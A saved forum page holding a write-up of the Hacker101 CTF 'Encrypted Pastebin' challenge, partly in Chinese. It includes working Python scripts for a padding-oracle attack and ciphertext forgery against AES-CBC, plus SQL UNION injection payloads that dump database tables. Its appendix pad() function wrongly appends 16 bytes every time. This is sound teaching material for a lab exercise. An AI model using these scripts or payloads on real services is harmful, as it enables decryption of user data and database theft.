+                    <form method="get" action="/search">
+                        <input type="text" placeholder="search" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/jquery.js"></script>
+    <script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/toc.js"></script>
+    <script src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/dt.js"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title "><font style="vertical-align: inherit;">Hacker101 CTF Encrypted Pastebin write-up </font></span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/26607">
+                        <span class="username cell"><font style="vertical-align: inherit;">Werner </font></span></a> <span class="i-seprator"><font style="vertical-align: inherit;">/ </font></span>
+                    <span><font style="vertical-align: inherit;">2020-01-07 09:33:59 </font></span><span class="i-seprator"><font style="vertical-align: inherit;">/ </font></span>
+                    <span><font style="vertical-align: inherit;">Views 11335 </font></span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/1"><font style="vertical-align: inherit;">Security Technology </font></a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/13"><font style="vertical-align: inherit;">CTF </font></a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(7054);"><font style="vertical-align: inherit;">
+              top(0) </font></a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(7054);"><font style="vertical-align: inherit;">
+              step(0) </font></a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h2 id="toc-0"><font style="vertical-align: inherit;">Background introduction </font></h2>
+<p><a href="https://www.hackerone.com/" target="_blank"><font style="vertical-align: inherit;">Hackerone </font></a><font style="vertical-align: inherit;">is a bug bounty platform. To obtain the project qualification of the platform, you need to answer the </font><a href="https://ctf.hacker101.com/ctf" target="_blank"><font style="vertical-align: inherit;">Hacker101 CTF </font></a><font style="vertical-align: inherit;">question.
+ Different questions have different numbers of flags, and each flag 
+corresponds to a different point due to the difficulty of the question. 
+For every 26 points you get an invitation to a private project. </font></p>
+<p><font style="vertical-align: inherit;">This article documents the solution to a problem called " </font><a href="https://ctf.hacker101.com/ctf/launch/4" target="_blank"><font style="vertical-align: inherit;">Encrypted Pastebin </font></a><font style="vertical-align: inherit;">".
+ This question requires the skills of Web and Crypto, the difficulty is 
+Hard, there are 4 flags, and each flag is worth 9 points. </font></p>
+<p><font style="vertical-align: inherit;">This article was written on 
+December 15, 2019. By the time the reader reads this article, times may 
+have changed, and the Hacker101 CTF may no longer have this title, or 
+the content may have changed. However, this article records the entire 
+answering process in detail as much as possible, and there is no 
+question that does not affect the reading and understanding of this 
+article. </font></p>
+<p><font style="vertical-align: inherit;">If the reader is answering this question but has no way forward, it is recommended that the reader </font><strong><font style="vertical-align: inherit;">not </font></strong><font style="vertical-align: inherit;">continue
+ reading this article, otherwise it will damage the original intention 
+of answering this question. Please close this article with this tip: 
+padding oracle. </font></p>
+<h2 id="toc-1"><font style="vertical-align: inherit;">Topic description </font></h2>
+<p><font style="vertical-align: inherit;">The address of the topic is 
+dynamic and will be different every once in a while, so the address of 
+the topic cannot be given here. Also because of its dynamic nature, the 
+address of the title in the related code or screenshots in the following
+ text may be different. As long as the reader knows that although the 
+address is different, it is actually the same title, it will not affect 
+the reading. </font></p>
+<p><font style="vertical-align: inherit;">After opening the topic, you will see a web page, as shown below: </font></p>
+<p><a id="img0" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223006-b8bdb4bc-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223006-b8bdb4bc-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">The prompt text is: </font></p>
+<blockquote><p><font style="vertical-align: inherit;">We've developed 
+the most secure pastebin on the internet. Your data is protected with 
+military-grade 128-bit AES encryption. The key for your data is never 
+stored in our database, so no hacker can ever gain unauthorized access. </font></p>
+</blockquote>
+<p><font style="vertical-align: inherit;">From the prompt text, we know 
+that the encryption algorithm is AES, the key length is 128 bits, and 
+the packet is 16 bytes. In addition we also know that the keys to 
+encrypt user data are not stored in the database. </font></p>
+<p><font style="vertical-align: inherit;">we enter </font><code>Title</code><font style="vertical-align: inherit;">for </font><code>1</code><font style="vertical-align: inherit;">, the content is also </font><code>1</code><font style="vertical-align: inherit;">,then click </font><code>Post</code><font style="vertical-align: inherit;">button, the page jumps to: </font></p>
+
+<pre><code>http://35.190.155.168/fc2fd7e530/?post=LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~</code></pre>
+<p><font style="vertical-align: inherit;">Observe this URL and see that the path has not changed, just more </font><code>post</code><font style="vertical-align: inherit;">Parameter,
+ the parameter value looks like base64 encoding, but there is a little 
+difference. The content of the page is shown in the following figure: </font></p>
+<p><a id="img1" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223033-c8dff53a-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223033-c8dff53a-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">This topic is like this, a 
+single function Web page. At first, I was confused about what this thing
+ is for, but then I realized that Pastebin, like Blog and BBS, is a kind
+ of web application. Its function is to store and share a piece of plain
+ text data, usually source code. For example, Ubuntu provides its own </font><a href="https://paste.ubuntu.com/" target="_blank"><font style="vertical-align: inherit;">Pastebin </font></a><font style="vertical-align: inherit;">service.
+ One of the application scenarios is that a group of people use IRC to 
+discuss programming issues. One person wants to share a piece of code 
+with everyone. Then he can store this code in Pastebin and share the 
+link with everyone, so as to avoid large blocks of code from swiping the
+ screen. Interested people can generally get a better reading experience
+ by opening the link to view the code. </font></p>
+<p><font style="vertical-align: inherit;">According to the previous 
+Hacker101 CTF questions, we know that each vulnerability corresponds to a
+ flag. Now all we have to do is to find the vulnerability of this 
+encrypted Pastebin service. </font></p>
+<h2 id="toc-2"><font style="vertical-align: inherit;">Flag 1 </font></h2>
+<p><font style="vertical-align: inherit;">At first, I had no idea, I thought about entering abnormal data and trying to cause an error. will </font><code>post</code><font style="vertical-align: inherit;">The value of the parameter is changed to </font><code>1</code><font style="vertical-align: inherit;">, the result is unexpected after submission, and a flag is directly obtained, as shown in the following figure. </font></p>
+<p><a id="img2" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223102-da0ac682-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223102-da0ac682-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">In the error we see how the server decodes </font><code>post</code><font style="vertical-align: inherit;">Parameters: </font></p>
+
+<pre><code>b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))</code></pre>
+<p><font style="vertical-align: inherit;">In fact, it is base64 
+encoding, but 3 key characters are replaced. For simplicity, it will be 
+referred to as base64 encoding in the following text. In the error 
+message, we also see that we are decoding by base64 </font><code>post</code><font style="vertical-align: inherit;">parameters, call a </font><code>decryptLink</code><font style="vertical-align: inherit;">The function decrypts it, decodes it as UTF-8 after decryption, and parses it in json format: </font></p>
+
+<pre><code>post = json.loads(decryptLink(postCt).decode('utf8'))</code></pre>
+<p><font style="vertical-align: inherit;">The useful information is 
+temporarily seen from this error. But at the same time we know that a 
+lot of information can be gained by triggering an error. </font></p>
+<h2 id="toc-3"><font style="vertical-align: inherit;">Flag 2 </font></h2>
+<h3 id="toc-4"><font style="vertical-align: inherit;">Error 1 </font></h3>
+<p><font style="vertical-align: inherit;">Now consider triggering other errors and submit to the server that the base64 decoding can be successful, but when calling </font><code>decryptLink</code><font style="vertical-align: inherit;">Decryption error data. we know how to decode </font><code>post</code><font style="vertical-align: inherit;">parameters, you will know how to code </font><code>post</code><font style="vertical-align: inherit;">parameter. submit </font><code>post</code><font style="vertical-align: inherit;">The parameters are </font><code>MTix</code><font style="vertical-align: inherit;">(a valid base64 encoding), this time the error is: </font></p>
+<p><a id="img3" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223121-e50e7010-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223121-e50e7010-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">Through this error, we see </font><code>decryptLink</code><font style="vertical-align: inherit;">The content of a line of code in the function is: </font></p>
+
+<pre><code>cipher = AES.new(staticKey, AES.MODE_CBC, iv)</code></pre>
+<p><font style="vertical-align: inherit;">It seems that encryption and decryption </font><code>post</code><font style="vertical-align: inherit;">The key used by the parameter is static ( </font><code>staticKey</code><font style="vertical-align: inherit;">).
+ Also saw that the encryption uses CBC mode. The error says that the IV 
+(initial vector) length must be 16 bytes, it seems that the IV is from </font><code>post</code><font style="vertical-align: inherit;">extracted from the parameters. </font></p>
+<h3 id="toc-5"><font style="vertical-align: inherit;">Error 2 </font></h3>
+<p><font style="vertical-align: inherit;">Now consider triggering a new error, put 16 </font><code>*</code><font style="vertical-align: inherit;">encoding, the result is: </font></p>
+
+<pre><code>KioqKioqKioqKioqKioqKg~~</code></pre>
+<p><font style="vertical-align: inherit;">Submitting this parameter successfully triggers a new error report, as shown in the following figure. </font></p>
+<p><a id="img4" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223141-f139504e-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223141-f139504e-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">From this error we see </font><code>decryptLink</code><font style="vertical-align: inherit;">The last line of code in the function reads: </font></p>
+
+<pre><code>return unpad(cipher.decrypt(data))</code></pre>
+<p><font style="vertical-align: inherit;">report an error </font><code>string index out of range</code><font style="vertical-align: inherit;">, should be submitted </font><code>post</code><font style="vertical-align: inherit;">The
+ parameter length is 16 bytes, which is just enough for IV, and the 
+actual data is 0, so this error is generated. Also notice that there is a
+ </font><code>unpad</code><font style="vertical-align: inherit;">Operation, see the function name, its function should be to remove the padding (pad). </font></p>
+<h3 id="toc-6"><font style="vertical-align: inherit;">Error 3 </font></h3>
+<p><font style="vertical-align: inherit;">Then try to trigger a new error, put 32 </font><code>*</code><font style="vertical-align: inherit;">encoding, the result is: </font></p>
+
+<pre><code>KioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKio~</code></pre>
+<p><font style="vertical-align: inherit;">Submitting this parameter successfully triggers a new error report, as shown in the following figure. </font></p>
+<p><a id="img5" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223159-fc2b5b96-20d9-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223159-fc2b5b96-20d9-1.png"></a></p>
+<p><font style="vertical-align: inherit;">In this error, there is an intriguing </font><code>PaddingException</code><font style="vertical-align: inherit;">,
+ combined with the CBC mode, the padding oracle attack can be used to 
+solve the plaintext. Although Mr. Luo talked about this attack method in
+ the cryptography class at the university, he could not remember the 
+specific details. After checking some information, I filled in the 
+details and wrote a Python script to execute the attack. The content of 
+the script is as follows. There is a lot of information about the 
+attack. After searching a lot on the Internet, I will not give specific 
+reference links here. The following text assumes that the reader is 
+aware of the details of the padding oracle attack. If not, please refer 
+to the information first. </font></p>
+
+<pre><code>import base64
+import requests
+
+def decode(data):
+    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))
+
+def encode(data):
+    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')
+
+def bxor(b1, b2): # use xor for bytes
+    result = b""
+    for b1, b2 in zip(b1, b2):
+        result += bytes([b1 ^ b2])
+    return result
+
+def test(url, data):
+    r = requests.get(url+'?post={}'.format(data))
+    if 'PaddingException' in r.text:
+        return False
+    else:
+        return True
+
+def generate_iv_list(tail):
+    iv = b'\x00' * (16 - len(tail) -1)
+    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]
+
+def padding_oracle(real_iv, url, data):
+    index = 15
+    plains = bytes()
+    tail = bytes()
+    while index &gt;= 0:
+        for iv in generate_iv_list(tail):
+            if test(url, encode(iv+data)):
+                plains = bytes([(16-index) ^ iv[index]]) + plains
+                index -= 1
+                tail = bytes([plain ^ (16-index) for plain in plains])
+                break
+    return bxor(real_iv, plains)
+
+if __name__ == '__main__':
+    post = 'LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~'
+    url = 'http://35.190.155.168/fc2fd7e530/'
+
+    i = 1
+    plains = bytes()
+    data = decode(post)
+    length = len(data)
+    while True:
+        if i*16 &lt; length:
+            iv = data[(i-1)*16: i*16]
+            plains += padding_oracle(iv, url, data[i*16: (i+1)*16])
+        else:
+            break
+        i += 1
+    print(plains)</code></pre>
+<p><font style="vertical-align: inherit;">Running this script, it took about 1 hour to solve the plaintext: </font></p>
+
+<pre><code>{"flag": "^FLAG^597a59999a26c9f1b48d7xxxxxxxxxxxxxxxxxxxxxxxxxxxb153f505d4755bf2$FLAG$", "id": "3", "key": "XjPkmljch5E2sMiNhsNiqg~~"}\n\n\n\n\n\n\n\n\n\n</code></pre>
+<p><font style="vertical-align: inherit;">So far I got the second flag. </font></p>
+<h2 id="toc-7"><font style="vertical-align: inherit;">Flag 3 </font></h2>
+<p><font style="vertical-align: inherit;">Observe the solved plaintext and find that it is in json format with three keys, the first one is </font><code>flag</code><font style="vertical-align: inherit;">, which should serve purely for CTFs and have no practical significance; the second is </font><code>id</code><font style="vertical-align: inherit;">, the value is </font><code>3</code><font style="vertical-align: inherit;">; the third is </font><code>key</code><font style="vertical-align: inherit;">,
+ the value is encoded with base64, and after decoding it is found to be 
+16-byte long binary data, how to look like an AES key, use it to decrypt
+ directly </font><code>post</code><font style="vertical-align: inherit;">The parameter fails, it appears to be a key elsewhere. </font></p>
+<p><font style="vertical-align: inherit;">We know that in addition to the padding oracle attack, CBC also has a byte flip attack. The byte flip attack can be used to </font><code>id</code><font style="vertical-align: inherit;">Depend on </font><code>3</code><font style="vertical-align: inherit;">Change it to another value, such as </font><code>1</code><font style="vertical-align: inherit;">.
+ But the actual attempt found that this would not work, because the 
+principle of the byte flip attack is to modify the value of one byte in 
+the ciphertext packet, so that the byte in the corresponding position of
+ the plaintext in the next packet is modified according to our wishes. 
+Doing this It will cause the plaintext decrypted by the modified 
+ciphertext block to become garbled, and this garbled code often cannot 
+be decoded according to UTF-8. </font><code>decode('utf8')</code><font style="vertical-align: inherit;">will trigger when </font><code>UnicodeDecodeError</code><font style="vertical-align: inherit;">Mistake. </font></p>
+<p><font style="vertical-align: inherit;">in order to avoid </font><code>UnicodeDecodeError</code><font style="vertical-align: inherit;">Error,
+ we cannot modify any ciphertext, so we can only modify the IV. By 
+modifying the IV, we can control the plaintext of the first packet. The 
+principle is shown in the figure below. Use the desired plaintext to XOR
+ the original (known) plaintext, and use the result as a new IV. When 
+decrypting, XOR will get the plaintext we want again. </font></p>
+<p><a id="img6" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223221-09508918-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223221-09508918-20da-1.png"></a></p>
+<p><font style="vertical-align: inherit;">However </font><code>id</code><font style="vertical-align: inherit;">Appears
+ in the 6th plaintext packet and cannot be directly modified. 
+Fortunately, we have full control over the IV and ciphertext, so part of
+ the ciphertext can be discarded. For the convenience of observation, 
+first group the plaintext by 16 bytes, the result is as follows: </font></p>
+
+<pre><code>{"flag": "^FLAG^
+597a59999a26c9f1
+b48d7xxxxxxxxxxx
+xxxxxxxxxxxxxxxx
+b153f505d4755bf2
+$FLAG$", "id": "
+3", "key": "XjPk
+mljch5E2sMiNhsNi
+qg~~"}\n\n\n\n\n
+\n\n\n\n\n</code></pre>
+<p><font style="vertical-align: inherit;">Then design the plaintext we want: </font></p>
+
+<pre><code>{"id":"1", "i":"
+3", "key": "XjPk
+mljch5E2sMiNhsNi
+qg~~"}\n\n\n\n\n
+\n\n\n\n\n</code></pre>
+<p>对比可知完全抛弃了前5个分组，只保留了后5ge分组，并且后5个分组中只有第1个分组的内容是改变了的。这样我们计算出合适的IV，便可以得到想要的结果。具体的计算方法见代码：</p>
+
+<pre><code>post = 'LPTALJ-WW1!q1nfGhY54lVwmLGQexY7uNSfsUowFr2ercuG5JXhsPhd8qCRF8VhNdeZCxxwCcvztwOURu!Nu!oTs3O7PKqDolpVZAxybuxaIPInRPlTm1mos!7oCcyHvPxS5L!gthTFpbJfrE0Btn3v9-gVly!yyMceC-FQlgsta53SGNVNHBVnwE0fWiLw8Yh2kKNk5Uu9KOWSItZ3ZBQ~~'
+data = decode(post)[16*(1+5):]    # 抛弃原始密文的前5个分组（加1是因为有16字节的IV）
+iv_6 = decode(post)[16*(1+4):16*(1+5)]    # 第5个分组的密文，也就是第6个分组的“IV”
+immediate = bxor(b'$FLAG$", "id": "', iv_6)    # 第6个分组密文解密的直接结果
+iv = bxor(immediate, b'{"id":"1", "i":"')    # 计算出合适的IV
+print(encode(iv+data))</code></pre>
+<p>运行该代码计算出对应<code>post</code>参数为：</p>
+
+<pre><code>11is9FtK5stoIrb8SWs77z8UuS!4LYUxaWyX6xNAbZ97!foFZcv8sjHHgvhUJYLLWud0hjVTRwVZ8BNH1oi8PGIdpCjZOVLvSjlkiLWd2QU~</code></pre>
+<p>提交此参数，没有成功查询出<code>id</code>为<code>1</code>的条目，但成功拿到了新的flag，如下图。</p>
+<p><a id="img7" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223239-138d21c0-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223239-138d21c0-20da-1.png"></a></p>
+<p>通过错误提示推测这是因为服务器只加密了body没有加密title，flag存储在title中，尝试解密body时触发了错误（因为key是id=3的数据的，不是id=1的数据的），但好在错误信息中包含了title的值。</p>
+<h2 id="toc-8">Flag 4</h2>
+<p>继续设法触发新的报错，试试SQL注入。构造如下的明文，把<code>id</code>的值设置为单引号：</p>
+
+<pre><code>{"id":"'", "i":"
+3", "key": "XjPk
+mljch5E2sMiNhsNi
+qg~~"}\n\n\n\n\n
+\n\n\n\n\n</code></pre>
+<p>计算出对应<code>post</code>为：</p>
+
+<pre><code>11is9FtK5t1oIrb8SWs77z8UuS!4LYUxaWyX6xNAbZ97!foFZcv8sjHHgvhUJYLLWud0hjVTRwVZ8BNH1oi8PGIdpCjZOVLvSjlkiLWd2QU~</code></pre>
+<p>提交此参数，如愿以偿地看到了SQL注入的报错，甚至知道了具体的SQL语句是什么，如下图。</p>
+<p><a id="img8" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223256-1e08ad4a-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223256-1e08ad4a-20da-1.png"></a></p>
+<p>但按现有的方法，我们最多只能控制9个字符。9个字符是无论如何都无法完成注入的。</p>
+<p>多方查阅资料后在一篇文章中看到说padding oracle攻击不仅可以用来解密明文，还可以用来构造解密出<strong>任意指定</strong>明文的密文。又在《<a href="https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html" target="_blank">Automated Padding Oracle Attacks with PadBuster</a>》中找到了具体的原理，其实非常简单，是我们前面做法的推广。这里简单叙述一下原理。</p>
+<p><a id="img9" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223316-29b87b52-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223316-29b87b52-20da-1.png"></a></p>
+<p>如上图，已知利用padding oracle攻击我们可以在不知道密钥的情况下解密出<strong>任意</strong>密文对应的<code>Intermediary Value</code>，在CBC模式中<code>Intermediary Value</code>和IV或上一块密文异或得到<code>Decrypted Value</code>。为构造解密出任意指定明文的密文，我们先将明文分组并按PKCS#5填充。然后随机生成16字节数据做最后一块密文，用padding oracle计算出它的<code>Intermediary Value</code>，用<code>Intermediary Value</code>异或最后一块明文得到倒数第二块密文。用padding oracle计算出倒数第二块密文的<code>Intermediary Value</code>，用<code>Intermediary Value</code>异或倒数第二块明文得到倒数第三块密文。依此类推，直到计算出IV。</p>
+<p>看懂原理后写了一个Python脚本来实现这种攻击，脚本太长为了不影响阅读附在文末。</p>
+<p>首先构造明文：</p>
+
+<pre><code>{"id":"0 UNION SELECT database(), ''","key":"XjPkmljch5E2sMiNhsNiqg~~"}</code></pre>
+<p>计算出对应<code>post</code>参数为：</p>
+
+<pre><code>vpxsCHeQyFv5Xz4ITQHcTgNDCEuKQ1YRvZU6JINj2La063Cs2XWp0GsHLGVmrVFfrwmnx-gmZgdPBL16ODezPqd5DrohLnQvjeJK7!STgHyNFotCtLYeOCS2-IVdPQHA</code></pre>
+<p><a id="img10" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223333-33f898b8-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223333-33f898b8-20da-1.png"></a></p>
+<p>得到数据库名为<code>level3</code>。</p>
+<p>接着构造明文：</p>
+
+<pre><code>{"id":"0 UNION SELECT group_concat(TABLE_NAME), '' from information_schema.tables where TABLE_SCHEMA='level3'","key":"XjPkmljch5E2sMiNhsNiqg~~"}</code></pre>
+<p>计算出对应<code>post</code>参数为：</p>
+
+<pre><code>7yUXiAErbrYDMQu9o6!rEsLGp-qFoWKIc!n22RVLCUNmFRKq9OZtyTtyPOy3LNbMLyQJmYODUBikZMkFlGdYJ2bIzCAsMXWK8pZJ94T7HNGYCAnZbf6eb0vpocf-ybAo42WQc9dUv8Iw7!9WZe76ETDW!M7obDKpipW4WMM9l3TJPkw0pFrSNtOHB1XmaKv23hh51E8cGTaU-1P27YqZZY0Wi0K0th44JLb4hV09AcA~</code></pre>
+<p><a id="img11" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223346-3bc81e10-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223346-3bc81e10-20da-1.png"></a></p>
+<p>得到数据库<code>level3</code>中有表<code>posts</code>和<code>tracking</code>，前一个表的内容我们已经知道了，所以关心后一个表，构造如下明文查询它有哪些列：</p>
+
+<pre><code>{"id":"0 UNION SELECT group_concat(column_name), '' from information_schema.columns where TABLE_NAME='tracking'","key":"XjPkmljch5E2sMiNhsNiqg~~"}</code></pre>
+<p>计算出对应<code>post</code>参数为：</p>
+
+<pre><code>xjYpoCshfUQiElru19HYf04qjeYVD8CoA9XmG2Oly9ECT7stCN-AuV5PqBw5FOTaMmYIYykBwq7wUHJ08kc6jjNgK8pwZ0-U3024MxjwrCgGJu3qOBz91H1qn5DT5zducioD06x1w3HClw2grzbdreZgLFq!JQJMk8VhhXweN65GVLlJwibidmS4SFd0XZYh7HVnylECByiK5U3o85SHe40Wi0K0th44JLb4hV09AcA~</code></pre>
+<p><a id="img12" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223358-42d23b5a-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223358-42d23b5a-20da-1.png"></a></p>
+<p>得到表<code>tracking</code>有列<code>id</code>和<code>headers</code>，<code>id</code>里应该没有实际数据，所以我们试图查询出<code>headers</code>。为此构造明文：</p>
+
+<pre><code>{"id":"0 UNION SELECT group_concat(headers), '' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"}</code></pre>
+<p>计算出对应<code>post</code>参数为：</p>
+
+<pre><code>be6Lqymj1Mmo5urgkMavFVbMAhGyzY8DKY94bPMcjvq!wzT2jIXMFVg-5aEFeap-zVKyX8oHocYl4foLJe76ETDW!M7obDKpipW4WMM9l3TJPkw0pFrSNtOHB1XmaKv23hh51E8cGTaU-1P27YqZZY0Wi0K0th44JLb4hV09AcA~</code></pre>
+<p><a id="img13" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223417-4e01f538-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223417-4e01f538-20da-1.png"></a></p>
+<p>成功的查出了所有的<code>headers</code>，但其中没有flag。观察数据，看到<code>headers</code>应该是http的头部，其中也包含<code>post</code>参数，都试一试，发现第一个<code>post</code>参数可以解出一个新的flag，如下图。</p>
+<p><a id="img14" href="https://xzfile.aliyuncs.com/media/upload/picture/20191217223428-54c5c598-20da-1.png"><img src="Hacker101%20CTF%20Encrypted%20Pastebin%20write-up%20-%20Prophet%20Community_files/20191217223428-54c5c598-20da-1.png"></a></p>
+<p>至此，拿到了全部的4个flag。</p>
+<h2 id="toc-9">总结</h2>
+<p>先总结一下Encrypted 
+Pastebin的工作流程：每次接到用户数据都随机生成一个key对其进行加密，加密结果存储在数据库中，然后用固定密钥staticKey加密随机生
+成的key，并将加密结果和数据库条目id编码后返回给用户。用户直接打开链接就可以看到存储的数据，和非加密的Pastebin一样方便。加密用户数据
+的密钥确实没有存储在数据库中，和首页宣传的一致。</p>
+<p>这道题目对我来说是很有难度的，我花了一整个周末才完成它。一方面它让我复习/新学了密码学知识，另一方面，也是更重要的——它教导我不要轻易放
+弃。在进行padding 
+oracle攻击时，速度很慢很慢，由于编程错误跑了很久却没有任何结果，让我心灰意冷，反复修改多次才终于成功。进行SQL注入时，由于一开始不知道利
+用padding 
+oracle攻击可以构造解密出任意指定明文的密文便毫无思路，并且已经拿到了27分，几乎真的放弃了。后来觉得若是现在放弃，今后再做又得复习前面的所
+有步骤，白白浪费时间，才又坚持做下去。</p>
+<h2 id="toc-10">附录</h2>
+<p>生成解密出任意指定明文的密文的Python脚本：</p>
+
+<pre><code>import base64
+import requests
+
+def trans(s):
+    return "b'%s'" % ''.join('\\x%.2x' % x for x in s)
+
+
+def decode(data):
+    return base64.b64decode(data.replace('~', '=').replace('!', '/').replace('-', '+'))
+
+
+def encode(data):
+    return base64.b64encode(data).decode('utf-8').replace('=', '~').replace('/', '!').replace('+', '-')
+
+
+def bxor(b1, b2): # use xor for bytes
+    result = b""
+    for b1, b2 in zip(b1, b2):
+        result += bytes([b1 ^ b2])
+    return result
+
+
+def test(url, data):
+    r = requests.get(url+'?post={}'.format(data))
+    if 'PaddingException' in r.text:
+        return False
+    else:
+        print(r.url)
+        return True
+
+def generate_iv_list(tail):
+    iv = b'\x00' * (16 - len(tail) -1) 
+    return [iv+bytes([change])+tail for change in range(0x00, 0xff+1)]
+
+
+def padding_oracle_decrypt(url, data):
+    print('破解数据：{}'.format(data))
+    index = 15
+    intermediary = bytes()
+    tail = bytes()
+    while index &gt;= 0:
+        for iv in generate_iv_list(tail):
+            print('尝试初始向量：{}'.format(trans(iv)))
+            if test(url, encode(iv+data)):
+                intermediary = bytes([(16-index) ^ iv[index]]) + intermediary
+                index -= 1
+                tail = bytes([temp ^ (16-index) for temp in intermediary])
+                break
+    return intermediary
+
+
+def pad(data, block_size):
+    """按PKCS#5填充"""
+    amount_to_pad = block_size - (len(data) % block_size)
+    if amount_to_pad == 0:
+        amount_to_pad = block_size
+    pad = bytes([amount_to_pad])
+    return data + pad * 16
+
+
+if __name__ == '__main__':
+    url = 'http://35.190.155.168/fc2fd7e530/'
+    post = 'OQ9EaI4kACeslNOW5XuTWpnKWmjyduYd0CnPDOFVUNW6tmnWyxyj-ID-xbYIkUaXrg-F4T!!5!4cZxh738rhQ-1QhYP1GcIy-tx0HILgW9bqTiWFGCgrCqTJKoLfoKlXjRaLQrS2HjgktviFXT0BwFPxx29x7i1UxDdLeC7ZAVxvJ4WDvDyxzEc3vNxuRE5UB!dytTf!iY32Cpl8iiI7LQ~~'
+    ciphertext = decode(post)[16*6:16*7]
+    immediate = bxor(b'$FLAG$", "id": "', decode(post)[16*(1+4):16*(1+5)])
+
+    plains = '{"id":"0 UNION SELECT group_concat(headers), \'\' from tracking","key":"XjPkmljch5E2sMiNhsNiqg~~"}'
+    data = pad(plains.encode('utf-8'), 16)
+    block_amount = int(len(data) / 16)
+    index = block_amount
+    while True:
+        block = data[(index-1)*16: index*16]
+        print('处理块：')
+        print(block)
+        iv = bxor(immediate, block)
+        ciphertext = iv + ciphertext
+        index -= 1
+        if index &gt; 0:
+            immediate = padding_oracle_decrypt(url, iv)
+        else:
+            break
+    print(encode(ciphertext))</code></pre>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="7054">
